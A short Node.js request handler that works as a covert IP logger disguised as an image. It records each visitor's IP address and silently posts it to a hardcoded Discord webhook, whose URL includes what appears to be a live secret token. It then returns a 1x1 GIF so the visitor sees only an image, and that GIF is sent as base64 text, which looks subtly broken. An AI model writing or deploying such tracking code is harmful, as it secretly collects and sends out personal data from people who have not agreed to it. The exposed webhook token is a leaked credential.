const https = require('https');

module.exports = function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  
  const data = JSON.stringify({content: `View ${ip}`});
  
  const webhook = 'https://discord.com/api/webhooks/1464006669796118610/NtLug816A6N5psWgUjMrUBFe-yRtvmPvmIC8hMrbORLuDrxP4QnErus1K5XH2pKlqXi9';
  
  try {
    const url = new URL(webhook);
    const options = {
      hostname: url.hostname,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data)}
    };
    https.request(options).end(data);
  } catch (e) {}
  
  res.setHeader('Content-Type', 'image/gif');
  res.send('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
};